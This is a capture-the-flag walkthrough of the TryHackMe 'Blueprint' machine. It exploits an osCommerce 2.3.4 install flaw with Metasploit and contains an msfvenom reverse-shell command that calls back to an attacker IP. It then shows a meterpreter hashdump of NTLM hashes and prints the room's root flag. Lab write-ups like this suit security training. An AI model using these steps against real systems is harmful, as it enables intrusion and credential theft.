# Blueprint - Metasploit

---

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled.png)

---

# Enumeration

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%201.png)

```tsx
PORT      STATE  SERVICE      VERSION
80/tcp    open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
.
.
.
8080/tcp  open   http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Index of /
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
```

On the default port `80` of target machine running `http` service, the `http-title` is `404` which mean the page is not set up on this port

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%202.png)

Let’s move to port `8080` which has multiple directories such as:

- `oscommerce-2.3.4/`
- `oscommerce-2.3.4/catalog/`
- `oscommerce-2.3.4/docs/`

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%203.png)

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%204.png)

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%205.png)

View the `catalog/` path and it return a html page → Get around and find some vulnerabilities in here

# Exploit

After researching about ************oscommerce 2.3.4************, there is a directory `/install` which could exploitable

```
If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible for an unauthenticated attacker to reinstall the page
```

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%206.png)

Start the ********************metasploit******************** and search for Module `oscommerce`

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%207.png)

Set the options as following with your own `LHOST` and `LPORT`

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%208.png)

Let’s exploit

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%209.png)

We are in but the the shell is not stable

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%2010.png)

Here, we need a payload reverse shell to get through this

Create a shell with `msfvenom`

```tsx
┌──(kali㉿kali)-[~/TryHackMe/Blueprint]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.97.213 LPORT=4242 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes

┌──(kali㉿kali)-[~/TryHackMe/Blueprint]
└─$ ls -l 
total 76
-rw-r--r-- 1 kali kali 73802 Jun 18 10:32 shell.exe
```

Start another ******************metasploit****************** and use module `exploit/multi/handler`

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%2011.png)

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%2012.png)

Type `exploit` to start listening

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%2013.png)

Go back to the first ******************metasploit****************** window, upload the `shell.exe` and `execute` it

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%2014.png)

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%2015.png)

```
meterpreter > hashdump                                                                                                                           
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::                                                           
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

We got the hash → Use ********************Crackstation******************** to crack the hash and get the NTLM decrypted

![Untitled](Blueprint%20-%20Metasploit%20bece5b0bb02746c5aabbc5a1b9b7abb5/Untitled%2016.png)

Back to the previous ********************metasploit********************, navigate to `C:\Users\Administrator\Desktop` → Get the root flag

```
meterpreter > pwd                                                                                                             
C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
meterpreter > cd C:
meterpreter > cd Users                                                                                                                                       
meterpreter > cd Administrator                                                                                                                               
meterpreter > cd Desktop                                                                                                                                     
meterpreter > ls                                                                                                                                             
Listing: C:\Users\Administrator\Desktop                                                                                                                      
=======================================                                                                                                                      
                                                                                                                                                             
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-04-11 18:36:47 -0400  desktop.ini
100666/rw-rw-rw-  37    fil   2019-11-27 13:15:37 -0500  root.txt.txt

meterpreter > cat root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```